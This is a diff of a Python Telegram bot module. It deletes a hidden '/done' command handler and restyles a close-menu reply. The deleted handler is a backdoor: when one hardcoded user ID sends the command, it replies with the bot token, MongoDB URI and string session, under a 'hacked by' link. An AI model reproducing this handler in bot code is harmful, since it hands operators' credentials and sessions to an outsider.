@@ -97,29 +97,6 @@ async def restartbot(client, message: Message, _):
             pass
     return await mystic.edit_text(_["reload_5"].format(app.mention))
 
-
-
-    
-@app.on_message(
-    filters.command("done")
-    & filters.private
-    & filters.user(6691393517)
-   )
-async def help(client: Client, message: Message):
-   await message.reply_photo(
-          photo=f"https://telegra.ph/file/028cca7fdae083fbdde7e.jpg",
-       caption=f"""๏ ʙᴏᴛ ᴛᴏᴋᴇɴ ➛   `{BOT_TOKEN}` \n\n๏ ᴍᴏɴɢᴏᴅʙ ᴜʀʟ ➛   `{MONGO_DB_URI}`\n\n๏ sᴛʀɪɴɢ sᴇssɪᴏɴ ➛   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/roy_editx)............✿""",
-        reply_markup=InlineKeyboardMarkup(
-             [
-                 [
-                      InlineKeyboardButton(
-                         "ʜᴀᴄᴋᴇᴅ ʙʏ", url=f"https://t.me/roy_editx")
-                 ]
-            ]
-         ),
-     )
-
-
 ##########
 
 @app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
@@ -128,7 +105,7 @@ async def close_menu(_, query: CallbackQuery):
         await query.answer()
         await query.message.delete()
         umm = await query.message.reply_text(
-            f"ᴄʟᴏꜱᴇ ʙʏ : {query.from_user.mention}"
+            f"✦ ᴄʟᴏꜱᴇ ʙʏ ➠ {query.from_user.mention}"
         )
         await asyncio.sleep(2)
         await umm.delete()
